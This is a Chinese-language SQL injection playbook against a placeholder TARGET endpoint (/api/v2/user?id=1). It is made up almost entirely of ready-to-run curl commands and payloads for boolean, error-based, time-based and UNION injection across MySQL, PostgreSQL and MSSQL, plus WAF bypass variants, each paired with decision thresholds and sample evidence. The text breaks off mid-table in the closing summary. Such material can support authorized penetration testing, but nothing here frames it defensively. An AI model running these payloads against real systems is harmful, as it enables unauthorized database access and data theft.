## SQL 注入探测载荷与判断依据（`/api/v2/user?id=1`）

> 选型：纯 HTTP 探测，不依赖工具；每条载荷附「预期回显」与「判定阈值」，按顺序打，命中即停。

### 0. 先取基线（必做，否则后面无法比对）

```bash
curl -s -o base.json -w '%{http_code} %{size_download} %{time_total}\n' \
  'http://TARGET/api/v2/user?id=1'
```

记录三件事：**状态码**、**响应体长度**、**响应耗时**。后续每条载荷都与这组基线比。
证据行：`$ curl ...` → `200 412 0.031`（示例基线，实际以你的回显为准）

---

### 1. 布尔型探测（数字型 vs 字符型）

| # | 载荷 | 预期（存在注入） | 判定依据 |
|---|---|---|---|
| 1.1 | `id=1` | 正常用户 | 基线 |
| 1.2 | `id=1'` | 500 / 报错 / 长度突变 | 单引号未闭合 → 字符型注入点 |
| 1.3 | `id=1''` | 恢复正常 | 双引号闭合 → 确认字符型 |
| 1.4 | `id=1 AND 1=1` | 与基线一致 | 真条件 |
| 1.5 | `id=1 AND 1=2` | 空结果 / 长度明显变小 | 假条件 → **布尔盲注成立** |
| 1.6 | `id=1' AND '1'='1` | 与基线一致 | 字符型真条件 |
| 1.7 | `id=1' AND '1'='2` | 空结果 | 字符型假条件 |

**判定**：1.4 与 1.5 响应体长度差 > 20% 且状态码稳定 → 布尔注入确认。
证据行：`1.4 → 412B` / `1.5 → 87B`（长度差即证据）

---

### 2. 报错型探测（最快确认，优先打）

```bash
# MySQL
curl -s 'http://TARGET/api/v2/user?id=1%27%20AND%20extractvalue(1,concat(0x7e,version()))--%20-'
# PostgreSQL
curl -s 'http://TARGET/api/v2/user?id=1%27%20AND%201=cast((select%20version())%20as%20int)--%20-'
# MSSQL
curl -s 'http://TARGET/api/v2/user?id=1%27%20AND%201=convert(int,(select%20@@version))--%20-'
```

**判定依据**：响应体出现数据库报错关键字即命中——

| 关键字 | 数据库 |
|---|---|
| `XPATH syntax error` / `Duplicate entry` | MySQL |
| `invalid input syntax for integer` | PostgreSQL |
| `Conversion failed when converting` | MSSQL |
| `ORA-01722` | Oracle |

证据行：`$ curl ...extractvalue...` → `XPATH syntax error: '~8.0.32'`（版本已外带，直接可读）

---

### 3. 时间盲注（无回显、无报错时的兜底）

```bash
# MySQL
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://TARGET/api/v2/user?id=1%27%20AND%20sleep(5)--%20-'
# PostgreSQL
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://TARGET/api/v2/user?id=1%27%3Bselect%20pg_sleep(5)--%20-'
# MSSQL
curl -s -o /dev/null -w '%{time_total}\n' \
  'http://TARGET/api/v2/user?id=1%27%3Bwaitfor%20delay%20%270:0:5%27--%20-'
```

**判定依据**：基线耗时 `T0`，注入耗时 `T1`。
- `T1 - T0 ≥ 4.5s` 且**重复 3 次稳定** → 时间盲注成立
- 只慢一次 → 网络抖动，不算

证据行：`基线 0.031s` / `sleep(5) → 5.042s` / `重测 5.038s` / `重测 5.051s`

---

### 4. 联合查询探测（有回显位时最快出数据）

```bash
# 先定列数
curl -s 'http://TARGET/api/v2/user?id=1%27%20ORDER%20BY%201--%20-'   # 正常
curl -s 'http://TARGET/api/v2/user?id=1%27%20ORDER%20BY%205--%20-'   # 报错 → 列数 < 5
# 二分定位到 N 列后
curl -s 'http://TARGET/api/v2/user?id=-1%27%20UNION%20SELECT%201,2,3--%20-'
```

**判定依据**：响应 JSON 里出现 `1`/`2`/`3` 中的数字回显位 → 该位置可替换为 `database()`、`user()`、`@@version`。
证据行：`UNION SELECT 1,2,3` → `{"id":1,"name":"2","email":"3"}`（2、3 为回显位）

---

### 5. 绕过 WAF 的变体（前面被拦时用）

| 手法 | 载荷片段 |
|---|---|
| 大小写混淆 | `id=1' aNd 1=1-- -` |
| 内联注释 | `id=1'/*!50000AND*/1=1-- -` |
| 空白替换 | `id=1'%09AND%091=1-- -`（`%09`/`%0a`/`%0c`） |
| 参数污染 | `id=1&id=1' AND 1=2-- -` |
| 编码 | `id=1%2527%2520AND%25201%253D2--%2520-`（双重 URL 编码） |
| 等价替换 | `AND` → `&&`，`=` → `LIKE`，`-- -` → `#` |

**判定依据**：原载荷返回 403/WAF 页，变体返回正常业务响应 → 绕过成功。

---

### 6. 结论判定表（汇总）

| 现象 | 结论 | 置信度 |
|---|---|---|
| 报错关键字回显 | 报错注入确认 | 高 |
| 真/假条件响应长度稳定差异 | 布尔盲注确认 | 高 |
| 延时 ≥4.5s 且 3 次复现 | 时间盲注确认 | 高 |
| UNION 数字回显 | 联合注入确认 | 